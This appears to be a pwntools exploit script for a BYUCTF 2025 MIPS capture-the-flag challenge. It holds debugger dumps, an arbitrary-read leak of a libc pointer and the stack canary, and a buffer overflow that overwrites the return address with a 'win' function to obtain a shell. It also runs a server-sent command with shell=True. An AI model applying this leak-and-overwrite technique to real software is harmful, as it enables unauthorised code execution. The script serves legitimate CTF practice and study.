#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP
# =========================================================
exe = './mips'
elf = context.binary = ELF(exe, checksec=True)
# libc = elf.libc
import os
os.environ['GDB'] = 'gdb-multiarch'
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = 'mips.chal.cyberjousting.com', 1357

pid = None

def gdbscript():
    global pid
    gdbscript = f'''
    init-pwndbg
    c
    '''.format(**locals())
    return gdbscript

def initialize(argv=[]):
    global pid
    if args.GDB:
        return process(["qemu-mipsel", "-g", "1234", "-L", "/root/mipsel-rootfs", exe] + argv)
    elif args.REMOTE:
        context.log_level = 'debug'
        p = remote(host, port, ssl=False)
        time.sleep(1)
        p.recvline()
        cmd = p.recvline().strip().decode()
        POC = subprocess.check_output(cmd, shell=True, text=True).strip()
        p.sendline(POC)
        time.sleep(1)
        return p
    elif args.DOCKER:
        p = remote("localhost", 5000)

        time.sleep(1)
        p.recvline()
        cmd = p.recvline().strip().decode()
        POC = subprocess.check_output(cmd, shell=True, text=True).strip()
        p.sendline(POC)
        time.sleep(1)
        # pid = process(["pgrep", "-fx", "/qemu /app/mips"]).recvall().strip().decode()
        # attach(int(pid), gdbscript=gdbscript(), sysroot=f"/proc/{pid}/root", exe='mips')
        return p
    else:
        return process(["qemu-mipsel", "-L", "/root/mipsel-rootfs", exe] + argv)


# =========================================================
#                         EXPLOITS
# =========================================================
# └─# pwn checksec mips     
# [*] '/home/kali/Windows/BYUCTF 2025/mips/ctf/mips'
#     Arch:       mips-32-little
#     RELRO:      Full RELRO
#     Stack:      Canary found
#     NX:         NX enabled
#     PIE:        No PIE (0x400000)

def exploit():
    global io
    io = initialize()
    # --------------------------------------------------------------------------------------------------------------------------------------------- registers ----
    # $zero/$r0   : 0x00000000
    # $at/$r1     : 0xfffffff8
    # $v0/$r2     : 0x00000000
    # $v1/$r3     : 0x00000001
    # $a0/$r4     : 0x2b380120  ->  0x00000045
    # $a1/$r5     : 0x2b2ab1a8  ->  0x2b382278  ->  0x00000000
    # $a2/$r6     : 0x00000002
    # $a3/$r7     : 0x00000000
    # $t0/$r8     : 0x00000001
    # $t1/$r9     : 0x00000000
    # $t2/$r10    : 0x00000409
    # $t3/$r11    : 0x00000000
    # $t4/$r12    : 0x2b2ab3f0  ->  0xe79fbad3
    # $t5/$r13    : 0x2b3816a0  ->  0xe79fbad3
    # $t6/$r14    : 0xb3d3c623
    # $t7/$r15    : 0x0279d783
    # $s0/$r16    : 0x2b2ab2ac  ->  0x2b2ab41f  ->  0x4f4c4f43 'COLORTERM=truecolor'
    # $s1/$r17    : 0x00000001
    # $s2/$r18    : 0x2b2ab2a4  ->  0x2b2ab418  ->  0x696d2f2e './mips'
    # $s3/$r19    : 0x00400d70 <main>  ->  0x27bdffd8
    # $s4/$r20    : 0x83837bf8
    # $s5/$r21    : 0x2b3813d0  ->  0x00000000
    # $s6/$r22    : 0x00000000
    # $s7/$r23    : 0x2b2ab140  ->  0x2b382278  ->  0x00000000
    # $t8/$r24    : 0x2b35b5b0  ->  0x67696c61 'aligned_alloc'
    # $t9/$r25    : 0x2b2da498  ->  0x3c1c000b
    # $k0/$r26    : 0x00000000
    # $k1/$r27    : 0x00000000
    # $gp/$r28    : 0x00430000
    # $sp/$r29    : 0x2b2ab1e0  ->  0x00000004
    # $fp/$s8/$r30: 0x00000000
    # $ra/$r31    : 0x00400dd8 <main+0x68>  ->  0x8fdc0010
    # $sr         : 0x20000010
    # $lo         : 0x00000000
    # $hi         : 0x00000000
    # $bad        : 0x00000000
    # $cause      : 0x00000000
    # $fsr        : 0x00000000
    # $fir        : 0x00739300
    # $pc         : 0x00400b58  ->  0x279c8010
    # ------------------------------------------------------------------------------------------------------------------------------------------------- stack ----
    #    $sp  0x2b2ab1e0|+0x0000|+000: 0x00000004
    #         0x2b2ab1e4|+0x0004|+001: 0x00000000
    #         0x2b2ab1e8|+0x0008|+002: 0x2b388290
    #         0x2b2ab1ec|+0x000c|+003: 0x00000000
    #         0x2b2ab1f0|+0x0010|+004: 0x2b380120  ->  0x00000045  <-  $a0
    #         0x2b2ab1f4|+0x0014|+005: 0x0a000001
    #         0x2b2ab1f8|+0x0018|+006: 0x2b380120  ->  0x00000045  <-  $a0
    #         0x2b2ab1fc|+0x001c|+007: 0x2b332afc  ->  0x000287c3
    # ---------------------------------------------------------------------------------------------------------------------------- code: mips:32 (gdb-native) ----
    #     0x400b4c 4000beaf          <NO_SYMBOL>   sw     s8, 64(sp) 
    #     0x400b50 25f0a003          <NO_SYMBOL>   move   s8, sp 
    #     0x400b54 43001c3c          <NO_SYMBOL>   lui    gp, 0x43 
    #  -> 0x400b58 10809c27          <NO_SYMBOL>   addiu  gp, gp, -32752 
    #     0x400b5c 1000bcaf          <NO_SYMBOL>   sw     gp, 16 (sp) 
    #     0x400b60 5080828f          <NO_SYMBOL>   lw     v0, -32688 (gp) 
    #     0x400b64 0000428c          <NO_SYMBOL>   lw     v0, 0 (v0) 
    #     0x400b68 3c00c2af          <NO_SYMBOL>   sw     v0, 60 (s8) 
    #     0x400b6c 2000c0af          <NO_SYMBOL>   sw     zero, 32 (s8) 
    # ----------------------------------------------------------------------------------------------------------------------------------------------- threads ----
    # [*Thread Id:1, tid:412929] stopped at 0x00400b58 <NO_SYMBOL>, reason: SINGLE STEP
    # ------------------------------------------------------------------------------------------------------------------------------------------------- trace ----
    # [*#0] 0x00400b58 <NO_SYMBOL>
    # ------------------------------------------------------------------------------------------------------------------------------------------------------------
    # gef> canary
    # ----------------------------------------------------------------------- canary value -----------------------------------------------------------------------
    # [+] Found AT_RANDOM at 0x2b2ab3f0, reading 4 bytes
    # [+] The canary is 0xe79fba00
    # ----------------------------------------------------------------------- found canary -----------------------------------------------------------------------
    # gef> xinfo 0x2b3816a0
    # -------------------------------------------------------------------- xinfo: 0x2b3816a0 --------------------------------------------------------------------
    # [ Legend: Code | Heap | Stack | Writable | ReadOnly | None | RWX ]
    # Start      End        Size       Offset     Perm Path
    # 0x2b37f000 0x2b382000 0x00003000 0x000bf000 rw- /root/mipsel-rootfs/lib/libc.so  <-  $a0, $t5, $s5
    # Offset (from mapped):  0x2b37f000 + 0x26a0
    # Offset (from base):    0x2b2b0000 + 0xd16a0
    # gef> x/wx 0x2b3816a0
    # 0x2b3816a0:     0xe79fbad3
    
    # Set breakpoint at 0x400b58 you can see the canary at register $t4 & $t5

    # gef> x/50wx 0x420000
    # 0x420000:       0x00000000      0x00000000      0x00000000      0x00000000
    # 0x420010:       0x2b382d1c      0x00000000      0x00000000      0x00000000
    # 0x420020:       0x00000000      0x80000000      0x00400d70      0x00000000
    # 0x420030:       0x2b332d08      0x2b37fff0      0x2b33ca44      0x2b332eac
    # 0x420040:       0x2b37ffec      0x2b2c28b0      0x00000000      0x2b3200a8
    # 0x420050:       0x2b332a24      0x2b2d5ea4      0x2b32e874      0x2b3311c0
    # 0x420060:       0x2b3816a0      0x2b37ffe8      0x2b3325b0      0x00000000
    # 0x420070:       0x2b2d5cf4      0x2b332d4c      0x00000000      0x00000000
    # 0x420080:       0x00000000      0x00000000      0x00000000      0x00000000
    # 0x420090:       0x00000000      0x00000000      0x00000000      0x00000000
    # 0x4200a0:       0x00422010      0x00000000      0x00000000      0x0000ff00
    # 0x4200b0:       0x00000000      0x00000000      0x00000000      0x00000000
    # 0x4200c0:       0x00000000      0x00000000

    # At the chall there is libc address that contains the canary at 0x420060
    with log.progress("Leak libc canary address"), context.silent:
        io.sendlineafter(b'> ', b'1')
        io.sendlineafter(b': ', b'0x420060')
        libc_leak = int(io.recvline().strip().decode(),16)
    log.info("Libc leak: %#x", libc_leak)

    with log.progress("Leak canary"), context.silent:
        io.sendlineafter(b'> ', b'1')
        io.sendlineafter(b': ', hex(libc_leak).encode())
        canary = int(io.recvline().strip().decode(),16)
    log.info("Canary: %#x", canary)

    with log.progress("Get shell with win func"), context.silent:
        win = 0x400964
        io.sendlineafter(b'> ', b'2')
        io.sendlineafter(b':\n', cyclic(16) + p32(canary)*2 + p32(win))

    io.interactive()

if __name__ == '__main__':
    exploit()
